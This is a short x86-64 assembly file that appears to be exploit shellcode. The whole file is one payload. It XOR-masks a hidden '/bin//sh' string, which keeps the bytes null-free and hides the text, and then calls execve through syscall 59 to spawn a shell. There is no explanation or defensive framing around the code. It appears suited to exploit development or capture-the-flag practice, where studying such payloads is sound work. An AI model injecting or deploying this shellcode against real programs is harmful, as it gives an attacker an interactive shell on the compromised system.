	.intel_syntax noprefix
	.globl _start
_start:
	xor rdx, rdx
	push rdx
	mov rax, 0x78722f2f6f79632f
	mov rbx, 0x1001000001100100
	xor rax, rbx
	push rax
	push rsp
	pop rdi	
	push rdx
	push rdi	
	push rsp
	pop rsi	
	lea rax, [rdx+59]
	syscall
